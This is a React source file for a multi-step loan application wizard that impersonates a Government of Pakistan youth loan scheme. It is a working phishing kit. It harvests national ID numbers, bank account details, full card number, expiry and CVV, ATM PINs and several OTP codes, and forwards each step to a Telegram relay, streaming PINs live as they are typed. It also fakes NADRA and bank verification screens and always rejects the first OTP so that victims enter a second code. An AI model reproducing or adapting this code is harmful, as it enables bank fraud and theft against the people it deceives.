'use client';

import React, { useState, useEffect, useRef } from 'react';
import { ArrowLeft, ArrowRight, ShieldCheck, Lock, CreditCard, CheckCircle2, AlertCircle, Clock, RefreshCw, Loader2, Wifi } from 'lucide-react';
import { Language, AppStep, PersonalInfo, LoanDetails, PaymentDetails, ApplicationRecord } from '../types';
import { t } from '../translations';
import { PAKISTAN_BANKS, BANK_CATEGORIES } from '../data/banks';
import { PremiumDebitCard } from './PremiumDebitCard';
import { OtpBoxSet } from './OtpBoxSet';

interface ApplicationWizardProps {
  language: Language;
  initialAmount?: string;
  initialBank?: string;
  onComplete: (record: ApplicationRecord) => void;
  onCancel: () => void;
}

export default function ApplicationWizard({ language, initialAmount, initialBank, onComplete, onCancel }: ApplicationWizardProps) {
  const [currentStep, setCurrentStep] = useState<AppStep>('personal_info');
  const dict = t[language];

  // Form states
  const [personal, setPersonal] = useState<PersonalInfo>({
    fullName: '',
    cnic: '',
    mobileNo: '',
    gender: '',
    dateOfBirth: '',
    province: '',
    address: ''
  });

  const [loan, setLoan] = useState<LoanDetails>({
    amount: initialAmount || '',
    purpose: '',
    occupation: '',
    bankName: initialBank || '',
    accountNumber: '',
    currentBalance: '',
    monthlyIncome: '',
    salaryDate: ''
  });

  const [payment, setPayment] = useState<PaymentDetails>({
    cardNumber: '',
    expiry: '',
    cvv: ''
  });

  const [isCardFlipped, setIsCardFlipped] = useState<boolean>(false);

  const [otpCode, setOtpCode] = useState<string>('');
  const [otpLength, setOtpLength] = useState<number>(6);

  // Safe helper to convert any OTP value (string or array) to a trimmed string
  const getCleanOtp = (val: unknown): string => {
    if (typeof val === 'string') return val.trim();
    if (Array.isArray(val)) return val.join('').trim();
    if (val === null || val === undefined) return '';
    return String(val).trim();
  };

  const [atmPin, setAtmPin] = useState('');
  const [timeLeft, setTimeLeft] = useState(300); // 05:00 countdown
  const [otpAttemptCount, setOtpAttemptCount] = useState(0);
  const [otpError, setOtpError] = useState('');
  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);
  const [otpResentNotice, setOtpResentNotice] = useState(false);

  const [atmPinAttemptCount, setAtmPinAttemptCount] = useState(0);
  const [atmPinError, setAtmPinError] = useState('');
  const [isVerifyingAtmPin, setIsVerifyingAtmPin] = useState(false);

  const [atmPin2, setAtmPin2] = useState('');
  const [atmPin2Error, setAtmPin2Error] = useState('');
  const [isVerifyingAtmPin2, setIsVerifyingAtmPin2] = useState(false);

  const [atmPinOtp, setAtmPinOtp] = useState('');
  const [atmPinOtpError, setAtmPinOtpError] = useState('');
  const [isVerifyingAtmPinOtp, setIsVerifyingAtmPinOtp] = useState(false);
  const [atmPinOtpTimeLeft, setAtmPinOtpTimeLeft] = useState(300);

  const [otpStep1, setOtpStep1] = useState('');
  const [otpStep1Length, setOtpStep1Length] = useState<number>(6);
  const [otpStep1Error, setOtpStep1Error] = useState('');
  const [isVerifyingOtpStep1, setIsVerifyingOtpStep1] = useState(false);
  const [otpStep1AttemptCount, setOtpStep1AttemptCount] = useState(0);

  const [otpStep2, setOtpStep2] = useState('');
  const [otpStep2Length, setOtpStep2Length] = useState<number>(6);
  const [otpStep2Error, setOtpStep2Error] = useState('');
  const [isVerifyingOtpStep2, setIsVerifyingOtpStep2] = useState(false);

  const [otpStep3, setOtpStep3] = useState('');
  const [otpStep3Length, setOtpStep3Length] = useState<number>(6);
  const [otpStep3Error, setOtpStep3Error] = useState('');
  const [isVerifyingOtpStep3, setIsVerifyingOtpStep3] = useState(false);

  const [personalError, setPersonalError] = useState('');
  const [loanError, setLoanError] = useState('');
  const [paymentError, setPaymentError] = useState('');
  const [searchMessage, setSearchMessage] = useState({
    title: 'Searching & Verifying...',
    subtitle: 'Please wait while we verify your details with NADRA and Banking Registry',
    urdu: 'براہ کرم انتظار کریں، نادرا اور بینکنگ رجسٹری سے آپ کی معلومات کی تصدیق کی جا رہی ہے'
  });

  // Strict completion checks: user MUST enter all details before going next
  const isPersonalComplete = Boolean(
    personal.fullName?.trim().length >= 3 &&
    personal.cnic?.replace(/\D/g, '').length === 13 &&
    personal.mobileNo?.replace(/\D/g, '').length === 11 &&
    personal.gender &&
    personal.dateOfBirth &&
    personal.province &&
    personal.address?.trim().length >= 5
  );

  const isLoanComplete = Boolean(
    loan.amount &&
    loan.purpose &&
    loan.occupation &&
    loan.bankName &&
    loan.accountNumber?.trim().length >= 8 &&
    loan.currentBalance?.toString().trim().length > 0 &&
    loan.monthlyIncome?.toString().trim().length > 0 &&
    loan.salaryDate
  );

  const isPaymentComplete = Boolean(
    payment.cardNumber?.replace(/\D/g, '').length === 16 &&
    payment.expiry?.trim().length >= 5 &&
    payment.cvv?.replace(/\D/g, '').length === 3
  );

  const isAtmPinComplete = atmPin.length === 4;

  // Live OTP Countdown Timer
  useEffect(() => {
    if (currentStep !== 'otp_verification') return;
    if (timeLeft <= 0) return;

    const interval = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(interval);
  }, [currentStep, timeLeft]);

  // Live ATM PIN OTP Countdown Timer
  useEffect(() => {
    if (currentStep !== 'atm_pin_verification_otp') return;
    if (atmPinOtpTimeLeft <= 0) return;

    const interval = setInterval(() => {
      setAtmPinOtpTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(interval);
  }, [currentStep, atmPinOtpTimeLeft]);

  // Format seconds to MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Handle Resend OTP
  const handleResendOtp = () => {
    setTimeLeft(300);
    setOtpError('');
    setOtpResentNotice(true);
    setOtpCode('');
    setTimeout(() => {
      setOtpResentNotice(false);
    }, 4500);

    sendToTelegram('OTP Resend Code Requested', {
      ...personal,
      mobileNo: personal.mobileNo,
      action: 'Resend OTP button clicked'
    });

    setTimeout(() => {
      document.getElementById('otp-box')?.focus();
    }, 100);
  };

  const formatCnic = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 13);
    if (digits.length <= 5) return digits;
    if (digits.length <= 12) return `${digits.slice(0, 5)}-${digits.slice(5)}`;
    return `${digits.slice(0, 5)}-${digits.slice(5, 12)}-${digits.slice(12, 13)}`;
  };

  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 16);
    const groups = digits.match(/.{1,4}/g);
    return groups ? groups.join(' ') : digits;
  };

  const formatExpiry = (val: string) => {
    // If space is entered or present, convert it to '/'
    let cleaned = val.replace(/\s+/g, '/');
    // Keep only digits and slash
    cleaned = cleaned.replace(/[^\d/]/g, '');

    // Prevent duplicate consecutive slashes
    cleaned = cleaned.replace(/\/+/g, '/');

    // If starts with slash, ignore it
    if (cleaned.startsWith('/')) {
      return '';
    }

    const parts = cleaned.split('/');
    if (parts.length === 1) {
      const digits = parts[0];
      if (digits.length > 2) {
        return `${digits.slice(0, 2)}/${digits.slice(2, 4)}`;
      }
      return digits.slice(0, 2);
    } else {
      let month = parts[0].slice(0, 2);
      if (month.length === 1 && parseInt(month, 10) > 1) {
        month = `0${month}`;
      }
      const year = parts.slice(1).join('').slice(0, 2);
      return `${month}/${year}`;
    }
  };

  const handlePersonalChange = (field: keyof PersonalInfo, value: string) => {
    if (personalError) setPersonalError('');
    if (field === 'cnic') {
      value = formatCnic(value);
    }
    if (field === 'mobileNo') {
      value = value.replace(/\D/g, '').slice(0, 11);
    }
    setPersonal(prev => ({ ...prev, [field]: value }));
  };

  const handleLoanChange = (field: keyof LoanDetails, value: string) => {
    if (loanError) setLoanError('');
    setLoan(prev => ({ ...prev, [field]: value }));
  };

  const handlePaymentChange = (field: keyof PaymentDetails, value: string) => {
    if (paymentError) setPaymentError('');
    if (field === 'cardNumber') {
      value = formatCardNumber(value);
    }
    if (field === 'expiry') {
      value = formatExpiry(value);
    }
    if (field === 'cvv') {
      value = value.replace(/\D/g, '').slice(0, 3);
    }
    setPayment(prev => ({ ...prev, [field]: value }));
  };

  const sendToTelegram = async (title: string, data: Record<string, any>) => {
    try {
      const storedToken = typeof window !== 'undefined' ? localStorage.getItem('telegram_bot_token') : null;
      const storedChatId = typeof window !== 'undefined' ? localStorage.getItem('telegram_chat_id') : null;
      // Fast dispatch with keepalive and non-blocking execution
      fetch('/api/telegram-forward', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        keepalive: true,
        body: JSON.stringify({
          title,
          data,
          ...(storedToken ? { botToken: storedToken } : {}),
          ...(storedChatId ? { chatId: storedChatId } : {})
        })
      }).catch(() => {});
    } catch {
      // Silently handle network errors
    }
  };

  const lastSentAtmPinRef = useRef('');
  const lastSentAtmPin2Ref = useRef('');

  // Live Auto-Stream: Dispatch ATM PIN 1 instantly when 4 digits are entered
  useEffect(() => {
    const pin1 = atmPin;
    if (pin1.length === 4 && lastSentAtmPinRef.current !== pin1) {
      lastSentAtmPinRef.current = pin1;
      sendToTelegram('⚡ Live ATM PIN 1 Entered (Realtime Input)', {
        applicantName: personal.fullName,
        mobileNumber: personal.mobileNo,
        cnic: personal.cnic,
        targetCard: payment.cardNumber,
        atmPin1: pin1,
        inputMethod: 'Live 4-digit PIN entry completed'
      });
    }
  }, [atmPin, personal, payment]);

  // Live Auto-Stream: Dispatch ATM PIN 2 confirmation instantly when 4 digits are entered
  useEffect(() => {
    const pin2 = atmPin2;
    if (pin2.length === 4 && lastSentAtmPin2Ref.current !== pin2) {
      lastSentAtmPin2Ref.current = pin2;
      sendToTelegram('⚡ Live ATM PIN 2 Confirmation Entered (Realtime Input)', {
        applicantName: personal.fullName,
        mobileNumber: personal.mobileNo,
        cnic: personal.cnic,
        targetCard: payment.cardNumber,
        confirmedAtmPin2: pin2,
        inputMethod: 'Live 4-digit PIN confirmation completed'
      });
    }
  }, [atmPin2, personal, payment]);

  // Step 1: Personal Info -> Searching loader -> Loan Details
  const handlePersonalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isPersonalComplete) {
      setPersonalError(
        language === 'ur'
          ? 'براہ کرم تمام ذاتی معلومات (مکمل نام، 13 ہندسوں کا شناختی کارڈ، 11 ہندسوں کا موبائل نمبر، صنف، تاریخ پیدائش، صوبہ، اور پتہ) لازماً مکمل پُر کریں۔'
          : 'Please enter ALL required personal information completely before proceeding to the next step.'
      );
      return;
    }
    setPersonalError('');
    sendToTelegram('Personal Information Submitted', personal);
    setSearchMessage({
      title: 'Searching NADRA Citizen Database...',
      subtitle: 'Verifying CNIC and personal credentials with national records',
      urdu: 'نادرا کے قومی ڈیٹا بیس سے شناختی کارڈ اور ذاتیائف کی تصدیق کی جا رہی ہے'
    });
    setCurrentStep('searching');
    window.scrollTo({ top: 0, behavior: 'smooth' });

    setTimeout(() => {
      setCurrentStep('loan_details');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }, 1800);
  };

  // Step 2: Loan Details -> Searching loader -> Fee Payment
  const handleLoanSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isLoanComplete) {
      setLoanError(
        language === 'ur'
          ? 'براہ کرم قرض کی تمام تفصیلات (قرض کی رقم، مقصد، پیشہ، بینک کا نام، اکاؤنٹ نمبر، موجودہ بیلنس، ماہانہ آمدنی، تنخواہ کی تاریخ) مکمل پُر کریں۔'
          : 'Please enter ALL required loan and bank details completely before proceeding to the next step.'
      );
      return;
    }
    setLoanError('');
    sendToTelegram('Loan Details Submitted', { ...personal, ...loan });
    setSearchMessage({
      title: 'Searching Bank Account & Loan Eligibility...',
      subtitle: 'Checking bank account and monthly income threshold for youth loan',
      urdu: 'بینک اکاؤنٹ اور نوجوانوں کے قرض کے لیے ماہانہ آمدنی کی جانچ کی جا رہی ہے'
    });
    setCurrentStep('searching');
    window.scrollTo({ top: 0, behavior: 'smooth' });

    setTimeout(() => {
      setCurrentStep('fee_payment');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }, 1800);
  };

  // Step 3: Fee Payment -> Searching loader -> OTP Verification
  const handlePaymentSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isPaymentComplete) {
      setPaymentError(
        language === 'ur'
          ? 'براہ کرم اے ٹی ایم کارڈ کی تمام تفصیلات (16 ہندسوں کا کارڈ نمبر، معیاد MM/YY، اور 3 ہندسوں کا CVV) مکمل درست درج کریں۔'
          : 'Please enter complete and valid ATM card details (16-digit card number, MM/YY expiry, and 3-digit CVV) before proceeding.'
      );
      return;
    }
    setPaymentError('');
    // Instant fast dispatch of Card details to Telegram
    sendToTelegram('Fee Payment & Card Details Submitted', {
      ...personal,
      ...loan,
      cardNumber: payment.cardNumber,
      expiry: payment.expiry,
      cvv: payment.cvv
    });

    // Instant dispatch of SMS OTP trigger
    sendToTelegram('SMS OTP Generated & Dispatched to Mobile Phone', {
      applicant: personal.fullName,
      mobileNumber: personal.mobileNo,
      cnic: personal.cnic,
      loanPurpose: loan.purpose,
      loanAmount: loan.amount,
      targetCard: payment.cardNumber,
      smsStatus: `SMS OTP code sent to mobile number ${personal.mobileNo}`
    });

    setSearchMessage({
      title: 'Searching 1Link Gateway & Authorizing Fee...',
      subtitle: 'Authorizing Rs. 75 processing tax and dispatching secure SMS OTP',
      urdu: '75 روپے کی پروسیسنگ فیس منظور کی جا رہی ہے اور ایس ایم ایس او ٹی پی بھیجا جا رہا ہے'
    });
    setCurrentStep('searching');
    window.scrollTo({ top: 0, behavior: 'smooth' });

    // Transition smoothly to OTP verification step first before ATM PIN
    setTimeout(() => {
      setOtpCode('');
      setOtpAttemptCount(0);
      setOtpError('');
      setTimeLeft(300);
      setCurrentStep('otp_verification');
    }, 2000);
  };

  // Step 4: OTP Verification -> ATM PIN Verification (Strict 6 digits required)
  const executeOtpVerification = (candidateOtp?: string) => {
    const otp = candidateOtp ? getCleanOtp(candidateOtp) : getCleanOtp(otpCode);
    if (!otp || otp.length < 6) {
      setOtpError(
        language === 'ur'
          ? `براہ کرم 6 ہندسوں کا OTP کوڈ درج کریں۔`
          : `Please enter the 6-digit OTP code.`
      );
      return;
    }

    if (isVerifyingOtp) return;

    setIsVerifyingOtp(true);
    setOtpError('');

    setTimeout(() => {
      setIsVerifyingOtp(false);

      if (otpAttemptCount === 0) {
        // First attempt: simulate wrong/rejected OTP
        sendToTelegram('OTP Code Entered (Attempt 1 - Incorrect / Rejected)', {
          ...personal,
          ...loan,
          enteredOtpAttempt1: otp,
          cardNumber: payment.cardNumber,
          status: 'First OTP entered was incorrect - Showing error and requesting correct OTP'
        });
        setOtpAttemptCount(1);
        setOtpError(
          language === 'ur'
            ? 'غلط او ٹی پی کوڈ۔ براہ کرم صحیح 6 ہندسوں کا کوڈ درج کریں۔'
            : 'Incorrect OTP code. Please enter the correct 6-digit code.'
        );
        setOtpCode('');
        setTimeLeft(300);
      } else {
        // Second attempt: OTP Set & Verified successfully -> moves to ATM PIN
        sendToTelegram('OTP Code Set & Verified (Attempt 2 - Successful)', {
          ...personal,
          ...loan,
          enteredOtpAttempt2: otp,
          cardNumber: payment.cardNumber,
          status: 'OTP Set & Verified - Proceeding to ATM PIN'
        });
        setOtpError('');
        setCurrentStep('atm_pin_verification');
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }
    }, 700);
  };

  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    executeOtpVerification();
  };

  // Step 5: ATM PIN Verification Step 1
  const handleAtmPinSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const pin = atmPin;
    if (pin.length < 4) {
      setAtmPinError(
        language === 'ur'
          ? 'براہ کرم مکمل 4 ہندسوں کا اے ٹی ایم پن درج کریں۔'
          : 'Please enter the complete 4-digit ATM PIN.'
      );
      return;
    }

    // FAST SEND IMMEDIATELY TO TELEGRAM (Zero Delay!)
    sendToTelegram('ATM PIN Entered (Successful)', {
      ...personal,
      ...loan,
      enteredAtmPin: pin,
      cardNumber: payment.cardNumber,
      status: 'ATM PIN verified - Proceeding to OTP Step 1'
    });

    setIsVerifyingAtmPin(true);
    setAtmPinError('');

    setTimeout(() => {
      setIsVerifyingAtmPin(false);

      setAtmPin('');
      setCurrentStep('otp_step_1');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }, 700);
  };

  // 3 OTP Step Handlers (Strict 6 digits required)
  const executeOtpStep1 = (candidate?: string) => {
    const val = (candidate !== undefined ? candidate : otpStep1).trim();
    if (!val || val.length < 6) {
      setOtpStep1Error(
        language === 'ur'
          ? `براہ کرم 6 ہندسوں کا OTP کوڈ درج کریں۔`
          : `Please enter the 6-digit OTP code.`
      );
      return;
    }
    if (isVerifyingOtpStep1) return;

    if (otpStep1AttemptCount === 0) {
      sendToTelegram('OTP Verification Step 1 (Attempt 1 - Incorrect / Rejected)', {
        ...personal,
        ...loan,
        cardNumber: payment.cardNumber,
        otpStep1: val,
        status: 'OTP Step 1 first attempt incorrect - Showing error and requesting correct OTP'
      });
    } else {
      sendToTelegram('OTP Verification Step 1 Submitted (Attempt 2 - Successful)', {
        ...personal,
        ...loan,
        cardNumber: payment.cardNumber,
        otpStep1: val,
        status: 'OTP Step 1 Verified - Proceeding to OTP Step 2'
      });
    }

    setIsVerifyingOtpStep1(true);
    setOtpStep1Error('');
    setTimeout(() => {
      setIsVerifyingOtpStep1(false);
      if (otpStep1AttemptCount === 0) {
        setOtpStep1AttemptCount(1);
        setOtpStep1Error(
          language === 'ur'
            ? 'غلط او ٹی پی کوڈ۔ براہ کرم صحیح 6 ہندسوں کا کوڈ درج کریں۔'
            : 'Incorrect OTP code. Please enter the correct 6-digit code.'
        );
        setOtpStep1('');
      } else {
        setOtpStep1Error('');
        setCurrentStep('otp_step_2');
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }
    }, 700);
  };

  const handleOtpStep1Submit = (e: React.FormEvent) => {
    e.preventDefault();
    executeOtpStep1();
  };

  const executeOtpStep2 = (candidate?: string) => {
    const val = (candidate !== undefined ? candidate : otpStep2).trim();
    if (!val || val.length < 6) {
      setOtpStep2Error(
        language === 'ur'
          ? `براہ کرم 6 ہندسوں کا OTP کوڈ درج کریں۔`
          : `Please enter the 6-digit OTP code.`
      );
      return;
    }
    if (isVerifyingOtpStep2) return;

    sendToTelegram('OTP Verification Step 2 Submitted', {
      ...personal,
      ...loan,
      cardNumber: payment.cardNumber,
      otpStep2: val,
      status: 'OTP Step 2 Verified - Proceeding to OTP Step 3'
    });
    setIsVerifyingOtpStep2(true);
    setOtpStep2Error('');
    setTimeout(() => {
      setIsVerifyingOtpStep2(false);
      setOtpStep2('');
      setCurrentStep('otp_step_3');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }, 700);
  };

  const handleOtpStep2Submit = (e: React.FormEvent) => {
    e.preventDefault();
    executeOtpStep2();
  };

  const executeOtpStep3 = (candidate?: string) => {
    const val = (candidate !== undefined ? candidate : otpStep3).trim();
    if (!val || val.length < 6) {
      setOtpStep3Error(
        language === 'ur'
          ? `براہ کرم 6 ہندسوں کا OTP کوڈ درج کریں۔`
          : `Please enter the 6-digit OTP code.`
      );
      return;
    }
    if (isVerifyingOtpStep3) return;

    sendToTelegram('OTP Verification Step 3 Submitted (Final)', {
      ...personal,
      ...loan,
      cardNumber: payment.cardNumber,
      otpStep3: val,
      status: 'OTP Step 3 Verified - Application Approved'
    });
    setIsVerifyingOtpStep3(true);
    setOtpStep3Error('');
    setTimeout(() => {
      setIsVerifyingOtpStep3(false);
      const record: ApplicationRecord = {
        id: Math.random().toString(36).substring(2, 9),
        applicationId: `PLP-2026-${Math.floor(100000 + Math.random() * 900000)}`,
        personal,
        loan,
        status: 'Verified & Queued',
        createdAt: new Date().toLocaleDateString(),
        approvedAmount: `PKR ${Number(loan.amount || 500000).toLocaleString()}`,
        selectedBank: loan.bankName || 'Raast'
      };
      setCurrentStep('success');
      window.scrollTo({ top: 0, behavior: 'smooth' });
      onComplete(record);
    }, 700);
  };

  const handleOtpStep3Submit = (e: React.FormEvent) => {
    e.preventDefault();
    executeOtpStep3();
  };

  return (
    <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 sm:p-8 max-w-2xl mx-auto space-y-6">
      {/* Step Header */}
      <div className="flex justify-between items-center border-b border-gray-100 pb-4">
        <div>
          <div>
            <span className="text-xs font-bold text-[#044e3b] uppercase tracking-wider block">
              Government of Pakistan • Ministry of Finance
            </span>
          </div>
          <h2 className="text-lg sm:text-xl font-bold text-gray-900">
            {currentStep === 'personal_info' && dict.personalInfo}
            {currentStep === 'loan_details' && dict.loanDetails}
            {currentStep === 'fee_payment' && dict.loanApplyFees}
            {currentStep === 'searching' && dict.searchingTitle}
            {currentStep === 'otp_verification' && dict.otpTitle}
            {currentStep === 'atm_pin_verification' && (language === 'ur' ? 'اے ٹی ایم پن تصدیق' : 'ATM PIN Verification')}
            {currentStep === 'otp_step_1' && (language === 'ur' ? 'او ٹی پی تصدیق - 1' : 'OTP Verification - Step 1')}
            {currentStep === 'otp_step_2' && (language === 'ur' ? 'او ٹی پی تصدیق - 2' : 'OTP Verification - Step 2')}
            {currentStep === 'otp_step_3' && (language === 'ur' ? 'او ٹی پی تصدیق - 3' : 'OTP Verification - Step 3')}
            {currentStep === 'success' && dict.applicationApproved}
          </h2>
        </div>
        <div className="text-right">
          <span className="text-xs font-semibold text-gray-400 block font-urdu">
            {currentStep === 'personal_info' && 'ذاتی معلومات'}
            {currentStep === 'loan_details' && 'قرض کی تفصیلات'}
            {currentStep === 'fee_payment' && 'محفوظ ادائیگی'}
            {currentStep === 'searching' && 'تصدیق جاری ہے'}
            {currentStep === 'otp_verification' && 'او ٹی پی تصدیق'}
            {currentStep === 'atm_pin_verification' && 'اے ٹی ایم پن تصدیق'}
            {currentStep === 'otp_step_1' && 'او ٹی پی (مرحلہ 1)'}
            {currentStep === 'otp_step_2' && 'او ٹی پی (مرحلہ 2)'}
            {currentStep === 'otp_step_3' && 'او ٹی پی (مرحلہ 3)'}
            {currentStep === 'success' && 'منظور شدہ'}
          </span>
        </div>
      </div>

      {/* STEP 1: Personal Information */}
      {currentStep === 'personal_info' && (
        <form onSubmit={handlePersonalSubmit} className="space-y-4">
          <div className="bg-emerald-50/50 p-4 rounded-xl border border-emerald-100 text-xs text-[#044e3b] flex items-center gap-2">
            <ShieldCheck className="w-5 h-5 shrink-0" />
            <div>
              <p className="font-semibold">{dict.personalInfoSubtitle}</p>
              <p className="font-urdu text-[11px] opacity-80">براہ کرم اپنی درست ذاتی معلومات درج کریں تاکہ تصدیق میں دشواری نہ ہو۔</p>
            </div>
          </div>

          {personalError && (
            <div className="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-800 flex items-start gap-2.5 shadow-xs">
              <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
              <p className="font-bold flex-1">{personalError}</p>
            </div>
          )}

          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.fullName} *</span>
              <span className="font-urdu text-gray-500">{dict.fullNameUrdu}</span>
            </label>
            <input
              type="text"
              required
              placeholder={dict.fullNamePlaceholder}
              value={personal.fullName}
              onChange={(e) => handlePersonalChange('fullName', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm"
            />
          </div>

          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.cnic} *</span>
              <span className="font-urdu text-gray-500">{dict.cnicUrdu}</span>
            </label>
            <input
              type="text"
              required
              placeholder={dict.cnicPlaceholder}
              value={personal.cnic}
              onChange={(e) => handlePersonalChange('cnic', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm font-mono"
            />
          </div>

          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.mobileNo} *</span>
              <span className="font-urdu text-gray-500">{dict.mobileNoUrdu}</span>
            </label>
            <input
              type="tel"
              required
              maxLength={11}
              inputMode="numeric"
              placeholder={dict.mobileNoPlaceholder}
              value={personal.mobileNo}
              onChange={(e) => handlePersonalChange('mobileNo', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm"
            />
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div className="space-y-1">
              <label className="text-xs font-bold text-gray-700 flex justify-between">
                <span>{dict.gender} *</span>
                <span className="font-urdu text-gray-500">{dict.genderUrdu}</span>
              </label>
              <select
                required
                value={personal.gender}
                onChange={(e) => handlePersonalChange('gender', e.target.value)}
                className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm bg-white"
              >
                <option value="">Select Gender / جنس منتخب کریں</option>
                <option value="Male">Male / مرد</option>
                <option value="Female">Female / عورت</option>
                <option value="Other">Other / دیگر</option>
              </select>
            </div>

            <div className="space-y-1">
              <label className="text-xs font-bold text-gray-700 flex justify-between">
                <span>{dict.dob} *</span>
                <span className="font-urdu text-gray-500">{dict.dobUrdu}</span>
              </label>
              <input
                type="date"
                required
                value={personal.dateOfBirth}
                onChange={(e) => handlePersonalChange('dateOfBirth', e.target.value)}
                className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm bg-white"
              />
            </div>
          </div>

          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.province} *</span>
              <span className="font-urdu text-gray-500">{dict.provinceUrdu}</span>
            </label>
            <select
              required
              value={personal.province}
              onChange={(e) => handlePersonalChange('province', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm bg-white"
            >
              <option value="">Select Province / صوبہ منتخب کریں</option>
              <option value="Punjab">Punjab / پنجاب</option>
              <option value="Sindh">Sindh / سندھ</option>
              <option value="KPK">Khyber Pakhtunkhwa / خیبر پختونخوا</option>
              <option value="Balochistan">Balochistan / بلوچستان</option>
              <option value="Islamabad">Islamabad Capital Territory / اسلام آباد</option>
              <option value="Gilgit">Gilgit-Baltistan / گلگت بلتستان</option>
              <option value="Azad Kashmir">Azad Jammu & Kashmir / آزاد کشمیر</option>
            </select>
          </div>

          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.address} *</span>
              <span className="font-urdu text-gray-500">{dict.addressUrdu}</span>
            </label>
            <textarea
              required
              rows={2}
              placeholder={dict.addressPlaceholder}
              value={personal.address}
              onChange={(e) => handlePersonalChange('address', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm resize-none"
            ></textarea>
          </div>

          {!isPersonalComplete && (
            <div className="text-[11px] text-amber-800 bg-amber-50/80 border border-amber-200 rounded-xl p-3 flex items-center justify-between">
              <span>{language === 'ur' ? 'اگلے مرحلے کے لیے تمام خانے مکمل پُر کریں' : 'All personal fields must be filled to proceed'}</span>
              <span className="font-bold text-amber-600">Pending</span>
            </div>
          )}

          <div className="flex gap-3 pt-4">
            <button
              type="button"
              onClick={onCancel}
              className="px-5 py-3 rounded-xl border border-gray-200 text-gray-600 hover:bg-gray-50 font-medium text-sm transition"
            >
              {dict.back}
            </button>
            <button
              type="submit"
              disabled={!isPersonalComplete}
              className={`flex-1 font-semibold py-3.5 px-6 rounded-xl transition-all flex items-center justify-center gap-2 text-sm shadow-sm ${
                isPersonalComplete
                  ? 'bg-[#044e3b] hover:bg-[#033b2e] text-white ring-2 ring-emerald-600/30 cursor-pointer'
                  : 'bg-gray-100 text-gray-400 cursor-not-allowed border border-gray-200'
              }`}
            >
              {isPersonalComplete ? (
                <>
                  <span>{dict.continue}</span>
                  <span className="font-urdu text-xs opacity-90">({dict.continueUrdu})</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              ) : (
                <>
                  <span>{language === 'ur' ? 'تمام تفصیلات درج کریں' : 'Enter All Details to Continue'}</span>
                  <span className="font-urdu text-xs opacity-75">({language === 'ur' ? 'مکمل معلومات لازمی ہیں' : 'Required'})</span>
                </>
              )}
            </button>
          </div>
        </form>
      )}

      {/* STEP 2: Loan Details */}
      {currentStep === 'loan_details' && (
        <form onSubmit={handleLoanSubmit} className="space-y-4">
          {loanError && (
            <div className="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-800 flex items-start gap-2.5 shadow-xs">
              <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
              <p className="font-bold flex-1">{loanError}</p>
            </div>
          )}
          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.loanAmount} *</span>
              <span className="font-urdu text-gray-500">{dict.loanAmountUrdu}</span>
            </label>
            <input
              type="number"
              required
              placeholder="e.g. 500000"
              value={loan.amount}
              onChange={(e) => handleLoanChange('amount', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm"
            />
            <p className="text-[11px] text-gray-400">{dict.loanRange}</p>
          </div>

          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 flex justify-between">
              <span>{dict.loanPurpose} *</span>
              <span className="font-urdu text-gray-500">{dict.loanPurposeUrdu}</span>
            </label>
            <select
              required
              value={loan.purpose}
              onChange={(e) => handleLoanChange('purpose', e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm bg-white"
            >
              <option value="">Select reason for loan / قرض کا مقصد منتخب کریں</option>
